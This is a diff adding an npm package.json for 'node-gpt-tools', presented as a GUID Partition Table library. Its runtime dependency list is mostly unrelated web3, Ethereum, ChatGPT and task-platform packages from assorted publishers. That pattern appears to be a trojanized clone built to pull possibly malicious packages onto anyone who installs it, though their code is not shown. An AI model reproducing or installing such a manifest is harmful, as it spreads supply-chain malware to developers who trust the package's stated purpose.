@@ -1,0 +1,48 @@
+{
+  "name": "node-gpt-tools",
+  "version": "1.0.0",
+  "license": "MIT",
+  "description": "GUID Partition Table (GPT)",
+  "keywords": [
+    "GUID",
+    "partition",
+    "table",
+    "GPT",
+    "disk",
+    "hdd"
+  ],
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/umxsqt/node-gpt-tools.git"
+  },
+  "publishConfig": {
+    "access": "public",
+    "registry": "https://registry.npmjs.org/"
+  },
+  "main": "lib/gpt",
+  "scripts": {
+    "benchmark": "node benchmark",
+    "test": "echo `test`"
+  },
+  "dependencies": {
+    "cyclic-32": "1.2.0",
+    "@jonehome/chatgpt-web": "^1.0.8",
+    "ink-analysis": "^1.0.0",
+    "@karla1984/web3-core": "^1.0.6",
+    "@damnherzg/web3-blockchain": "^1.0.8",
+    "@ahmedueig/web3-tools": "1.0.3",
+    "batch-superfluid":"^1.0.0",
+    "eth-tools-pro": "^1.0.1",
+    "de-web3": "2.0.5",
+    "@jacktanws/web3-kit": "1.6.3",
+    "web3-eth-tools": "^1.0.0",
+    "web3-nav-pro":"^1.0.2",
+    "odyssey-task-platform": "^1.0.3",
+    "web3-utils-pro": "^1.0.1"
+  },
+  "devDependencies": {
+    "@jhermsmeier/control": "2.0.0",
+    "mbr": "1.1.3",
+    "nanobench": "2.1.1"
+  }
+}
